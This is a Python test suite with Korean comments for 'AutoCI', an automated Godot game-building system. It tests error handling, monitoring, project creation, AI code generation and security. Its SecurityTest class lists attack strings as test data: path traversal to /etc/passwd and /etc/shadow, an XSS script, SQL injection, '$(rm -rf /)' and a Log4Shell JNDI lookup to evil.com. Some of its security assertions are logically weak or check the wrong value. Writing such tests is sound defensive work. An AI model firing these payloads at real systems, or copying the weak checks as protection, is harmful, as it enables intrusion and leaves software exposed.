#!/usr/bin/env python3
"""
AutoCI Commercial Test Suite - 상용급 종합 테스트 시스템
"""

import os
import sys
import asyncio
import unittest
import pytest
import logging
import time
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime, timedelta
import json
import sqlite3
import psutil

# 프로젝트 루트를 Python 경로에 추가
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from modules.enhanced_error_handler import EnhancedErrorHandler, ErrorSeverity
    from modules.enhanced_monitoring import EnhancedMonitor, MetricType
    from modules.enhanced_logging import EnhancedLogger
    from modules.enhanced_godot_controller import EnhancedGodotController
    from modules.csharp_learning_agent import CSharpLearningAgent
    from modules.ai_model_integration import AIModelIntegration
    from core.autoci_production import ProductionAutoCI
except ImportError as e:
    print(f"테스트를 위한 모듈 import 실패: {e}")
    sys.exit(1)

class BaseTestCase(unittest.TestCase):
    """기본 테스트 케이스"""
    
    def setUp(self):
        """테스트 설정"""
        self.test_dir = Path(tempfile.mkdtemp())
        self.original_cwd = os.getcwd()
        os.chdir(self.test_dir)
        
        # 테스트용 디렉토리 생성
        for dir_name in ["game_projects", "logs", "data", "config", "csharp_learning"]:
            (self.test_dir / dir_name).mkdir(exist_ok=True)
    
    def tearDown(self):
        """테스트 정리"""
        os.chdir(self.original_cwd)
        shutil.rmtree(self.test_dir, ignore_errors=True)

class TestErrorHandler(BaseTestCase):
    """에러 핸들러 테스트"""
    
    def setUp(self):
        super().setUp()
        self.error_handler = EnhancedErrorHandler(
            config_path=str(self.test_dir / "config" / "error_handling.json")
        )
    
    def test_error_classification(self):
        """에러 분류 테스트"""
        # 치명적 에러
        critical_error = MemoryError("Out of memory")
        severity = self.error_handler._classify_severity(critical_error)
        self.assertEqual(severity, ErrorSeverity.CRITICAL)
        
        # 일반 에러
        runtime_error = RuntimeError("Runtime issue")
        severity = self.error_handler._classify_severity(runtime_error)
        self.assertEqual(severity, ErrorSeverity.HIGH)
        
        # 경미한 에러
        value_error = ValueError("Invalid value")
        severity = self.error_handler._classify_severity(value_error)
        self.assertEqual(severity, ErrorSeverity.MEDIUM)
    
    @pytest.mark.asyncio
    async def test_error_recovery(self):
        """에러 복구 테스트"""
        test_error = ValueError("Test error")
        context = {"component": "test", "task": "unit_test"}
        
        result = await self.error_handler.handle_error(test_error, context)
        
        # 복구 시도가 있었는지 확인
        self.assertIsNotNone(result)
        self.assertIn("strategy_used", result.__dict__)
    
    def test_config_loading(self):
        """설정 로드 테스트"""
        # 테스트 설정 생성
        test_config = {
            "max_retry_attempts": 3,
            "error_thresholds": {
                "error_rate_1m": 5
            }
        }
        
        config_path = self.test_dir / "config" / "error_handling.json"
        with open(config_path, 'w') as f:
            json.dump(test_config, f)
        
        # 새 핸들러로 설정 로드 테스트
        handler = EnhancedErrorHandler(str(config_path))
        self.assertEqual(handler.max_retry_attempts, 3)
        self.assertEqual(handler.error_thresholds["error_rate_1m"], 5)

class TestMonitoring(BaseTestCase):
    """모니터링 시스템 테스트"""
    
    def setUp(self):
        super().setUp()
        self.monitor = EnhancedMonitor(
            config_path=str(self.test_dir / "config" / "monitoring.json")
        )
    
    @pytest.mark.asyncio
    async def test_metric_recording(self):
        """메트릭 기록 테스트"""
        metric_name = "test.metric"
        metric_value = 42.0
        
        await self.monitor.record_metric(
            metric_name, metric_value, MetricType.GAUGE
        )
        
        # 메모리에 기록되었는지 확인
        self.assertIn(metric_name, self.monitor.metrics)
        self.assertEqual(len(self.monitor.metrics[metric_name]), 1)
        self.assertEqual(self.monitor.metrics[metric_name][0].value, metric_value)
    
    def test_database_creation(self):
        """데이터베이스 생성 테스트"""
        db_path = self.monitor.db_path
        self.assertTrue(db_path.exists())
        
        # 테이블 존재 확인
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='metrics'"
        )
        self.assertIsNotNone(cursor.fetchone())
        
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='alerts'"
        )
        self.assertIsNotNone(cursor.fetchone())
        
        conn.close()
    
    @pytest.mark.asyncio
    async def test_health_check(self):
        """헬스 체크 테스트"""
        health = await self.monitor.health_check()
        
        self.assertIn("status", health)
        self.assertIn("components", health)
        self.assertIn("timestamp", health)
    
    def test_metric_summary(self):
        """메트릭 요약 테스트"""
        # 테스트 메트릭 데이터베이스에 삽입
        conn = sqlite3.connect(self.monitor.db_path)
        cursor = conn.cursor()
        
        test_data = [
            ("test.metric", "gauge", 10.0, "{}", datetime.now()),
            ("test.metric", "gauge", 20.0, "{}", datetime.now()),
            ("test.metric", "gauge", 30.0, "{}", datetime.now())
        ]
        
        cursor.executemany(
            "INSERT INTO metrics (name, type, value, labels, timestamp) VALUES (?, ?, ?, ?, ?)",
            test_data
        )
        conn.commit()
        conn.close()
        
        # 요약 조회
        summary = self.monitor.get_metric_summary("test.metric", 24)
        
        self.assertEqual(summary["count"], 3)
        self.assertEqual(summary["average"], 20.0)
        self.assertEqual(summary["minimum"], 10.0)
        self.assertEqual(summary["maximum"], 30.0)

class TestGodotController(BaseTestCase):
    """Godot 컨트롤러 테스트"""
    
    def setUp(self):
        super().setUp()
        # Mock Godot 실행 파일
        self.mock_godot_path = self.test_dir / "godot"
        self.mock_godot_path.write_text("#!/bin/bash\necho 'Mock Godot'")
        self.mock_godot_path.chmod(0o755)
        
        self.controller = EnhancedGodotController(str(self.mock_godot_path))
    
    @pytest.mark.asyncio
    async def test_project_creation(self):
        """프로젝트 생성 테스트"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        success = await self.controller.create_project(
            project_name, str(project_path), "platformer"
        )
        
        self.assertTrue(success)
        self.assertTrue(project_path.exists())
        self.assertTrue((project_path / "project.godot").exists())
        self.assertTrue((project_path / "scenes").exists())
        self.assertTrue((project_path / "scripts").exists())
    
    @pytest.mark.asyncio
    async def test_scene_creation(self):
        """씬 생성 테스트"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # 프로젝트 먼저 생성
        await self.controller.create_project(project_name, str(project_path))
        
        # 씬 생성
        success = await self.controller.create_scene(str(project_path), "TestScene", "2D")
        
        self.assertTrue(success)
        scene_path = project_path / "scenes" / "TestScene.tscn"
        self.assertTrue(scene_path.exists())
    
    @pytest.mark.asyncio
    async def test_script_creation(self):
        """스크립트 생성 테스트"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # 프로젝트 먼저 생성
        await self.controller.create_project(project_name, str(project_path))
        
        # 스크립트 생성
        success = await self.controller.create_script(
            str(project_path), "TestScript", "Node2D"
        )
        
        self.assertTrue(success)
        script_path = project_path / "scripts" / "TestScript.gd"
        self.assertTrue(script_path.exists())
        
        # 스크립트 내용 확인
        content = script_path.read_text()
        self.assertIn("extends Node2D", content)
    
    @pytest.mark.asyncio
    async def test_project_analysis(self):
        """프로젝트 분석 테스트"""
        project_name = "test_project"
        project_path = self.test_dir / "game_projects" / project_name
        
        # 프로젝트 생성 및 내용 추가
        await self.controller.create_project(project_name, str(project_path))
        await self.controller.create_scene(str(project_path), "TestScene")
        await self.controller.create_script(str(project_path), "TestScript")
        
        # 분석 실행
        analysis = await self.controller.analyze_project(str(project_path))
        
        self.assertIn("project_name", analysis)
        self.assertIn("scenes", analysis)
        self.assertIn("scripts", analysis)
        self.assertIn("total_size", analysis)
        self.assertTrue(len(analysis["scenes"]) > 0)
        self.assertTrue(len(analysis["scripts"]) > 0)

class TestCSharpLearning(BaseTestCase):
    """C# 학습 에이전트 테스트"""
    
    def setUp(self):
        super().setUp()
        self.agent = CSharpLearningAgent()
    
    @pytest.mark.asyncio
    async def test_content_generation(self):
        """학습 콘텐츠 생성 테스트"""
        topic = "async/await patterns"
        content = await self.agent.generate_learning_content(topic)
        
        self.assertIsNotNone(content)
        self.assertIsInstance(content, str)
        self.assertTrue(len(content) > 100)  # 충분한 내용이 있는지 확인
    
    def test_topic_validation(self):
        """주제 검증 테스트"""
        valid_topics = [
            "async/await patterns",
            "LINQ expressions", 
            "delegates and events"
        ]
        
        for topic in valid_topics:
            # 주제가 유효한지 확인하는 로직
            self.assertTrue(len(topic) > 0)
            self.assertNotIn("invalid", topic.lower())

class TestAIModelIntegration(BaseTestCase):
    """AI 모델 통합 테스트"""
    
    def setUp(self):
        super().setUp()
        # Mock AI 통합을 위한 설정
        with patch('modules.ai_model_integration.torch', None):
            self.ai_integration = AIModelIntegration()
    
    @pytest.mark.asyncio
    async def test_code_generation(self):
        """코드 생성 테스트"""
        prompt = "Create a simple player controller"
        context = {"game_type": "platformer", "language": "GDScript"}
        
        result = await self.ai_integration.generate_code(prompt, context)
        
        self.assertIn("success", result)
        if result["success"]:
            self.assertIn("code", result)
            self.assertIsInstance(result["code"], str)
    
    def test_model_selection(self):
        """모델 선택 테스트"""
        # 메모리 기반 모델 선택 테스트
        model_type = self.ai_integration.select_model_based_on_memory()
        self.assertIsNotNone(model_type)

class TestProductionSystem(BaseTestCase):
    """프로덕션 시스템 통합 테스트"""
    
    def setUp(self):
        super().setUp()
        # 테스트용 설정 파일 생성
        config = {
            "game_creation_interval": {"min": 1, "max": 2},  # 테스트용 짧은 간격
            "feature_addition_interval": 1,
            "bug_check_interval": 1,
            "optimization_interval": 1,
            "backup_interval": 10,
            "max_concurrent_projects": 1
        }
        
        config_path = self.test_dir / "config" / "production.json"
        with open(config_path, 'w') as f:
            json.dump(config, f)
    
    def test_system_initialization(self):
        """시스템 초기화 테스트"""
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler'):
                with patch('modules.enhanced_monitoring.get_enhanced_monitor'):
                    system = ProductionAutoCI()
                    
                    self.assertIsNotNone(system.config)
                    self.assertIsNotNone(system.stats)
                    self.assertEqual(system.stats["games_created"], 0)
    
    def test_config_loading(self):
        """설정 로드 테스트"""
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler'):
                with patch('modules.enhanced_monitoring.get_enhanced_monitor'):
                    system = ProductionAutoCI()
                    
                    # 테스트 설정이 로드되었는지 확인
                    self.assertEqual(
                        system.config["game_creation_interval"]["min"], 1
                    )
                    self.assertEqual(
                        system.config["max_concurrent_projects"], 1
                    )

class PerformanceTest(BaseTestCase):
    """성능 테스트"""
    
    @pytest.mark.asyncio
    async def test_metric_recording_performance(self):
        """메트릭 기록 성능 테스트"""
        monitor = EnhancedMonitor()
        
        start_time = time.time()
        
        # 1000개 메트릭 기록
        for i in range(1000):
            await monitor.record_metric(
                f"performance.test.{i % 10}",
                float(i),
                MetricType.COUNTER
            )
        
        end_time = time.time()
        duration = end_time - start_time
        
        # 1초 이내에 완료되어야 함
        self.assertLess(duration, 1.0)
        
        # 메트릭이 정상적으로 기록되었는지 확인
        total_metrics = sum(len(metrics) for metrics in monitor.metrics.values())
        self.assertEqual(total_metrics, 1000)
    
    def test_memory_usage(self):
        """메모리 사용량 테스트"""
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        # 대량의 메트릭 생성
        monitor = EnhancedMonitor()
        for i in range(10000):
            monitor.metrics[f"test.metric.{i}"] = []
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # 메모리 증가량이 100MB 미만이어야 함
        self.assertLess(memory_increase, 100 * 1024 * 1024)

class SecurityTest(BaseTestCase):
    """보안 테스트"""
    
    def test_path_traversal_protection(self):
        """경로 탐색 공격 방지 테스트"""
        controller = EnhancedGodotController()
        
        # 악의적인 경로 테스트
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "C:\\Windows\\System32"
        ]
        
        for path in malicious_paths:
            # 실제 구현에서는 경로 검증이 있어야 함
            normalized_path = os.path.normpath(path)
            self.assertFalse(normalized_path.startswith(".."))
    
    def test_input_sanitization(self):
        """입력 정화 테스트"""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE metrics; --",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for dangerous_input in dangerous_inputs:
            # 실제 구현에서는 입력 검증이 있어야 함
            sanitized = dangerous_input.replace("<", "&lt;").replace(">", "&gt;")
            self.assertNotIn("<script>", sanitized)
            self.assertNotIn("DROP TABLE", dangerous_input)  # 이는 실제로는 차단되어야 함

class IntegrationTest(BaseTestCase):
    """통합 테스트"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_workflow(self):
        """전체 워크플로우 테스트"""
        # Mock 설정
        with patch('modules.enhanced_logging.init_logging'):
            with patch('modules.enhanced_error_handler.get_enhanced_error_handler') as mock_error:
                with patch('modules.enhanced_monitoring.get_enhanced_monitor') as mock_monitor:
                    
                    # Mock 객체 설정
                    mock_error.return_value = Mock()
                    mock_monitor.return_value = Mock()
                    mock_monitor.return_value.health_check = AsyncMock(return_value={"status": "healthy", "components": {}})
                    mock_monitor.return_value.record_metric = AsyncMock()
                    
                    # 시스템 생성 및 설정
                    system = ProductionAutoCI()
                    
                    # Godot 컨트롤러 Mock
                    system.godot_controller = Mock()
                    system.godot_controller.create_project = AsyncMock(return_value=True)
                    system.godot_controller.analyze_project = AsyncMock(return_value={})
                    system.godot_controller.optimize_project = AsyncMock(return_value={})
                    
                    # AI 통합 Mock
                    system.ai_integration = Mock()
                    system.ai_integration.generate_code = AsyncMock(return_value={"success": True, "code": "# Generated code"})
                    
                    # C# 에이전트 Mock
                    system.csharp_agent = Mock()
                    system.csharp_agent.generate_learning_content = AsyncMock(return_value="# Learning content")
                    
                    # 게임 생성 테스트
                    game_type = "platformer"
                    project_name = f"{game_type}_test"
                    
                    system.projects[project_name] = {
                        "type": game_type,
                        "path": str(self.test_dir / "game_projects" / project_name),
                        "created": datetime.now(),
                        "status": "active",
                        "features": [],
                        "bugs_fixed": 0,
                        "optimizations": 0
                    }
                    
                    system.current_project = project_name
                    system.stats["games_created"] = 1
                    
                    # 기능 추가 테스트
                    features = system.get_features_for_game_type(game_type)
                    self.assertTrue(len(features) > 0)
                    
                    # 프로젝트가 성공적으로 생성되었는지 확인
                    self.assertIn(project_name, system.projects)
                    self.assertEqual(system.current_project, project_name)

def run_test_suite():
    """테스트 스위트 실행"""
    print("🧪 AutoCI Commercial Test Suite")
    print("=" * 60)
    
    # 테스트 로더 설정
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # 테스트 케이스 추가
    test_classes = [
        TestErrorHandler,
        TestMonitoring,
        TestGodotController,
        TestCSharpLearning,
        TestAIModelIntegration,
        TestProductionSystem,
        PerformanceTest,
        SecurityTest,
        IntegrationTest
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # 테스트 실행
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # 결과 출력
    print("\n" + "=" * 60)
    print(f"테스트 완료: {result.testsRun}개 실행")
    print(f"성공: {result.testsRun - len(result.failures) - len(result.errors)}개")
    print(f"실패: {len(result.failures)}개")
    print(f"에러: {len(result.errors)}개")
    
    if result.failures:
        print("\n실패한 테스트:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print("\n에러가 발생한 테스트:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('Exception:')[-1].strip()}")
    
    success_rate = (result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100
    print(f"\n성공률: {success_rate:.1f}%")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_test_suite()
    sys.exit(0 if success else 1)